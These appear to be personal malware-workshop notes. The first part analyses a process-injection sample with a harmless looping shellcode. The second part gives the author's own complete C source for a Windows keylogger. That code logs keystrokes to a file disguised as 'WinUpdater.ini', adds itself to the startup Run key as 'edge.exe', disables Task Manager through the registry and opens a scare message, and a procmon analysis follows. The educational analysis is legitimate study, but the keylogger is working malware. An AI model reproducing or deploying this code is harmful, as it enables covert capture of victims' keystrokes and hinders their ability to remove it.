---
tags:
  - resources/workshops/MAWorkshop/tasks
---
# Outline
- [Analyzing Malware Part 1](#Analyzing%20Malware%20Part%201)
- [Developing Malware: Part 2](#Developing%20Malware:%20Part%202)
# Analyzing Malware: Part 1
We are given a source code file in C which does malicious things, we'll be analyzing it both statically and dynamically.
## Static Analysis
### Create_Process()

![Pasted image 20240910184148](Pasted%20image%2020240910184148.png)

What the function does is that it declares and initializes process related structures needed for process creation using `ZeroMemory()`

Then the function attempts to create a `notepad.exe` process which if fails, prints out the error code and returns gracefully.

Otherwise, the function returns this newly created process related information to `si` and `pi`, and waits forever until the process is terminated using the `WaitforSingleObject()` function.

>[!warning] Small issue up ahead:
>The fact that the main thread is on `WaitforSingleObject()` means that the thread will not execute any further lines until the process terminates which by then the entire program would have been terminated, so that line needs to be **commented out** to continue analysis.


### find_process_by_name()

This function takes a constant string (Process Name) as a parameter.

The function then attempts to find the process by name by taking a snapshot of all processes and then iterates over each single process until the process is found, we've talked about this function in greater detail below:
![hide_process()](../Task%203/C%20Task%203.md#hide_process())

### inject_code()
This function takes a process name (string) as an argument and attempts to open a handle to the given `process_id` with full access.

![Pasted image 20240911151128](Pasted%20image%2020240911151128.png)

The function then uses `VirtualAllocEx()` to allocate memory in the target process' address space with size of 4096 bytes with **Execute** permissions.

>Allocating memory with execute permissions is considered suspicious in the eyes of an EDR.

The function then writes the memory of that newly allocated memory by `VirtualAllocEx()` the content of the `shellcode` binary using `WriteProcessMemory()`

The function then creates a thread object in the target process' thread pool and passes the allocated shellcode binary as a routine for execution.
<mark style="background: #BBFABBA6;">
What this function does, as the name holds, is that it injects shellcode into a target process and creates a thread object to execute it.</mark>'

### main()
The main function simply calls each of the functions explained above and does this process injection on `notepad.exe`

![Pasted image 20240911153104](Pasted%20image%2020240911153104.png)

## Dynamic Analysis

When the program, we see an instance of notepad running, and the programs kindly prints out the PID of this instance.

Disassembling the shellcode will help us identify what the thread object will execute:
```nasm
NOP
NOP
NOP
NOP
jmp -2 ; Jump back to the beginning of the same instruction 
		; The instruction is 2 bytes long.
```


There is nothing visually interesting, so lets use [process hacker](https://processhacker.sourceforge.io/downloads.php) to do a memory analysis of the program, <mark style="background: #BBFABBA6;">we should be on the lookout for a page that is 4096 bytes long and with execute privileges.</mark>

Checking the memory space of the process, we find our base address with the specified protection!

![Pasted image 20240911183742](Pasted%20image%2020240911183742.png)

Checking the content of this page, we find the shellcode binary:

![Pasted image 20240911183845](Pasted%20image%2020240911183845.png)

Notice that the start address of this page is `0x2f60000`, notice that the `jmp -2` instruction begins at `0x2f60004`.

>Keep this in mind as we'll see it shortly.

After a brief moment of idleness, we find that one thread object of interest within the process, executing `ntdll!RtlUserThread` and has a <mark style="background: #FF5582A6;">high CPU usage and cycle deltas.</mark>

![Pasted image 20240911184150](Pasted%20image%2020240911184150.png)

Checking the call stack, we find a very interesting function that is called located at the address `0x2f60004`, this indicates that this thread object is indeed looping over the same address infinitely and consuming as much cycles as the thread can provide (In my case, my processor has a max clock cycle of 4.3 GHz).

![Pasted image 20240911185359](Pasted%20image%2020240911185359.png)

As for syscalls used by this program, there is plenty of noise in a normal Windows 10 installation (especially when we load exes), but we do see some familiar syscalls, such as `Process Create` for the injector process and `Thread Create` for the injected process (notepad.exe)

![Pasted image 20240912063749](Pasted%20image%2020240912063749.png)

# Developing Malware: Part 2
I've developed a malware that's based on the [](C%20Task%203.md.md#Keylogger.c|keylogger%20from%20Task%203) and added a few functionalities that makes it persistent and also spooky for the user.

```c
#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
HHOOK hHook;
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        if (wParam == WM_KEYDOWN) {
            KBDLLHOOKSTRUCT* p = (KBDLLHOOKSTRUCT*)lParam;
            CreateDirectory(L"C:\\temp", NULL);
            FILE* file = fopen("C:\\temp\\WinUpdater.ini", "a+");
            if (file) {
                fprintf(file, "%c", p->vkCode);
                fclose(file);
            }
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    HINSTANCE hInstance = GetModuleHandle(NULL); // Current Instance of exe.
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0); //Low level keyboard hook, triggering KeyboardProc in the current instance.
    MSG msg; //msg object
    while (GetMessage(&msg, NULL, 0, 0)) { // Obtain message in the thread message queue
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    UnhookWindowsHookEx(hHook);
    return 0;
}
void launch_notepad() {
    SHELLEXECUTEINFO shExecInfo;
    ZeroMemory(&shExecInfo, sizeof(SHELLEXECUTEINFO));
    shExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shExecInfo.fMask = SEE_MASK_DEFAULT;
    shExecInfo.hwnd = NULL;
    shExecInfo.lpVerb = L"open";
    shExecInfo.lpFile = L"notepad.exe";
    shExecInfo.lpParameters = L"LOL.txt";
    shExecInfo.lpDirectory = NULL;
    shExecInfo.nShow = SW_SHOW;
    shExecInfo.hInstApp = NULL;
    ShellExecuteEx(&shExecInfo);
}

void scare_message() {
    FILE* file = fopen("LOL.txt", "w+");
    if (file) {
        for (int i = 0; i < 1000; i++)
        {
            fprintf(file, "You've been hacked!!\n");
        }
        launch_notepad();
    }
} 

void static registry_adder(LPCWSTR key_path, LPCWSTR val_name) {
    HKEY hKey; // contains autorun registry key
    WCHAR myPath[4000];
    LPCWSTR keyPath = key_path;
    LPCWSTR valueName = val_name;
    GetModuleFileName(NULL, myPath, 4000); // obtain path to exe
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, valueName, 0, REG_SZ, (const BYTE*)myPath, (wcslen(myPath)+1) * sizeof(wchar_t));
    }
    RegCloseKey(hKey);
} // do one for the autorun (check for it as well) and disable task manager.

void disable_taskmgr() {
    HKEY hKey; // contains autorun registry key
    WCHAR myPath[5000];
    LPCWSTR keyPath = L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    LPCWSTR valueName = L"DisableTaskMgr";
    DWORD Value = 1;
    GetModuleFileName(NULL, myPath, 5000); // obtain path to exe
    RegCreateKeyEx(HKEY_CURRENT_USER, keyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey,NULL);
    if (RegOpenKeyEx(HKEY_CURRENT_USER, keyPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, valueName, 0, REG_DWORD, (const BYTE*)&Value, sizeof(Value));
    }
    RegCloseKey(hKey);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    HANDLE hThread = CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
    if (hThread) {
        scare_message();
        registry_adder(L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", L"edge.exe");
        disable_taskmgr();
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }
    return 0;
}
```

The malware achieves persistence by `registry_adder()` function where it adds a registry value to the key `HKCU/Software/Microsoft/Windows/CurrentVersion/Run` which adds the program to startup named as `edge.exe`

The malware also disables task manager from the currently logged in user by creating a new key named `System` under `HKCU/Software/Microsoft/Windows/CurrentVersion/Policies`.

Lastly, the malware attempts to scare the user by opening up notepad saying that the user's been hacked using `ShellExecuteEx()`

>[!note] Notice
>You may notice that the program's entry point is not `main()` but `WinMain()`. This is because this application is a Windows subsystem application which exterminates **the need for a console window.**

The malware uses a thread object to execute it's payload and also uses a few files from the system, so we should be able to see syscalls related to file opening/creation/reading.

## Dynamic Analysis

We'll be using procmon as a startup option so that we attempt to capture as many events as possible, we'll also use procexp to see open handles to objects.

We notice that has a handle to a file opened named `LOL.txt` which displays the "You're hacked!!" notepad window.

![Pasted image 20240914155816](Pasted%20image%2020240914155816.png)

We also notice a thread object executing a thread called `KeyloggerThread`.
> The reason we see this is because perhaps the developer (me) left symbols within the program, a typical malware might have their symbols and any debugging information stripped.

![Pasted image 20240914160418](Pasted%20image%2020240914160418.png)

We also see a few file manipulation related syscalls which interacts with a file in the temp directory in C:\\
![Pasted image 20240914161009](Pasted%20image%2020240914161009.png)

We also notice a few registry related syscalls that attempts to check a key within the autorun key hive (HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run).
![Pasted image 20240914161756](Pasted%20image%2020240914161756.png)

Lastly, we notice a registry addition named `DisableTaskMgr` which disables Task manager from the currently logged in user.
![Pasted image 20240914161843](Pasted%20image%2020240914161843.png)

![Pasted image 20240914162039](Pasted%20image%2020240914162039.png)